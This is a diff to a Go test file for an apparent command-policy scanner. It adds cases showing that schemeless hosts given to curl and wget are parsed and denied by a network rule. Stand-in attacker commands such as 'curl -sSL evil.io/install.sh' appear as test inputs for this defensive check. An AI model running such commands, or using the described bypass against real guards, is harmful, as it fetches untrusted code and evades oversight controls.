@@ -302,4 +302,51 @@ func TestExtractHosts(t *testing.T) {
 	if len(hosts) != 1 || hosts[0] != "evil.io" {
 		t.Errorf("hosts = %v, want [evil.io]", hosts)
 	}
+	// Bare host to curl (no scheme) must still be parsed as a host.
+	hosts = extractHosts("curl", []string{"evil.io"})
+	if len(hosts) != 1 || hosts[0] != "evil.io" {
+		t.Errorf("hosts = %v, want [evil.io] (bare curl host)", hosts)
+	}
+	// Boolean flags before a bare host must not swallow the host: -sSL/-v take
+	// no value, so evil.io is still the host.
+	hosts = extractHosts("curl", []string{"-sSL", "evil.io"})
+	if len(hosts) != 1 || hosts[0] != "evil.io" {
+		t.Errorf("hosts = %v, want [evil.io] (curl -sSL evil.io)", hosts)
+	}
+	// A value-taking option consumes its operand: -o config.yaml is a filename,
+	// only the bare host that follows counts.
+	hosts = extractHosts("curl", []string{"-o", "config.yaml", "evil.io"})
+	if len(hosts) != 1 || hosts[0] != "evil.io" {
+		t.Errorf("hosts = %v, want [evil.io] (config.yaml is -o value)", hosts)
+	}
+	// The --flag=value form is self-contained and consumes no operand.
+	hosts = extractHosts("curl", []string{"--output=config.yaml", "evil.io"})
+	if len(hosts) != 1 || hosts[0] != "evil.io" {
+		t.Errorf("hosts = %v, want [evil.io] (--output=config.yaml)", hosts)
+	}
+	// wget bare host.
+	hosts = extractHosts("wget", []string{"-q", "evil.io"})
+	if len(hosts) != 1 || hosts[0] != "evil.io" {
+		t.Errorf("hosts = %v, want [evil.io] (wget -q evil.io)", hosts)
+	}
+}
+
+// TestBareHostNetworkDeny pins that a bare (schemeless) host argument to curl or
+// wget is denied by R-NET-001 when it is not whitelisted, closing the
+// "curl evil.io" bypass.
+func TestBareHostNetworkDeny(t *testing.T) {
+	p := loadExamplePolicy(t)
+	for _, cmd := range []string{
+		"curl evil.io",
+		"curl -sSL evil.io/install.sh",
+		"wget evil.io",
+	} {
+		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
+		if decision != DecisionDeny {
+			t.Errorf("%q: decision = %q, want deny (findings: %+v)", cmd, decision, findings)
+		}
+		if !hasRule(findings, ruleNetworkID) {
+			t.Errorf("%q: missing R-NET-001: %+v", cmd, findings)
+		}
+	}
 }
